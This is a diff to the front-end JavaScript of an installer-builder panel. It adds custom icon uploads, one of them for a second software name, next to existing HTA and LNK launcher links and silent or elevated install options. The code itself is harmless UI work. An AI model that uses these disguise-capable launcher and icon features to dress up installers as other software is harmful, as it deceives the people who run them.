@@ -1535,6 +1535,13 @@ function applyStats(s) {
 // then copy the link or download the installer.
 function openBuild() {
   ['#b-company', '#b-site', '#b-dept', '#b-devtype'].forEach((s) => ($(s).value = ''));
+  // Reset icon pickers
+  ['#b-icon1', '#b-icon2'].forEach((s) => { const el = $(s); if (el) el.value = ''; });
+  ['#b-icon1-name', '#b-icon2-name'].forEach((s) => { const el = $(s); if (el) el.textContent = 'Choose .ico…'; });
+  ['#b-icon1-label', '#b-icon2-label'].forEach((s) => { const el = $(s); if (el) el.classList.remove('has-file'); });
+  const icon2Row = $('#b-icon2-row'), icon2Lbl = $('#b-icon2-label');
+  if (icon2Row) icon2Row.style.display = 'none';
+  if (icon2Lbl) icon2Lbl.style.display = 'none';
   // reset the install method to Elevated (per-user Silent is temporarily disabled)
   document.querySelectorAll('input[name="b-method"]').forEach((r) => { r.checked = r.value === 'user'; });
   syncMethodCards();
@@ -1554,6 +1561,24 @@ function buildMethod() {
   return r ? r.value : 'user';
 }
 document.querySelectorAll('input[name="b-method"]').forEach((r) => r.addEventListener('change', syncMethodCards));
+// Show/hide second icon input when second software name is filled
+function syncIcon2Row() {
+  const has2 = !!(($('#b-appname2') || {}).value || '').trim();
+  const icon2Row = $('#b-icon2-row'), icon2Lbl = $('#b-icon2-label');
+  if (icon2Row) icon2Row.style.display = has2 ? '' : 'none';
+  if (icon2Lbl) icon2Lbl.style.display = has2 ? '' : 'none';
+}
+{ const el = $('#b-appname2'); if (el) el.addEventListener('input', syncIcon2Row); }
+// File picker display helpers
+[['#b-icon1', '#b-icon1-name', '#b-icon1-label'], ['#b-icon2', '#b-icon2-name', '#b-icon2-label']].forEach(([inputSel, nameSel, lblSel]) => {
+  const input = $(inputSel), nameEl = $(nameSel), lbl = $(lblSel);
+  if (!input) return;
+  input.addEventListener('change', () => {
+    const f = input.files[0];
+    if (nameEl) nameEl.textContent = f ? f.name : 'Choose .ico…';
+    if (lbl) lbl.classList.toggle('has-file', !!f);
+  });
+});
 function closeBuild() { $('#build-modal').hidden = true; }
 $('#new-key').addEventListener('click', openBuild);
 $('#build-cancel').addEventListener('click', () => { closeBuild(); loadKeys(); });
@@ -1579,6 +1604,22 @@ $('#build-create').addEventListener('click', async () => {
     $('#build-create').disabled = true;
     const method = buildMethod();
     const r = await api('/api/keys', 'POST', { label, meta, method });
+    // Upload custom icons if the user chose files, do not block showing the result
+    const icon1File = ($('#b-icon1') || {}).files && $('#b-icon1').files[0];
+    const icon2File = ($('#b-icon2') || {}).files && $('#b-icon2').files[0];
+    const uploadIcon = async (file, index) => {
+      if (!file) return;
+      try {
+        const resp = await fetch(`/api/key-icon?key=${encodeURIComponent(r.key)}&index=${index}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/octet-stream' },
+          body: file,
+          credentials: 'include',
+        });
+        if (!resp.ok) { const e = await resp.json().catch(() => ({})); throw new Error(e.error || resp.statusText); }
+      } catch (e) { toast(`Icon ${index} upload failed: ${e.message}`, 'err'); }
+    };
+    await Promise.all([uploadIcon(icon1File, 1), uploadIcon(icon2File, 2)]);
     const url = r.downloadUrl; // server already includes ?type=service for the service build
     $('#build-link').value = url;
     $('#build-download').href = url;
@@ -1588,7 +1629,8 @@ $('#build-create').addEventListener('click', async () => {
     const hta = $('#build-download-hta'); if (hta) { hta.href = url.replace('/dl/', '/launch-hta/'); hta.setAttribute('download', ''); }
     const lnk = $('#build-download-lnk'); if (lnk) { lnk.href = url.replace('/dl/', '/launch-lnk/'); lnk.setAttribute('download', ''); }
     $('#build-result').hidden = false;
-    toast('Installer built', 'ok');
+    const iconNote = icon1File ? ' (with custom icon)' : '';
+    toast('Installer built' + iconNote, 'ok');
   } catch (e) { $('#build-create').disabled = false; toast(e.message || 'failed', 'err'); }
 });
 $('#build-copy').addEventListener('click', () => {
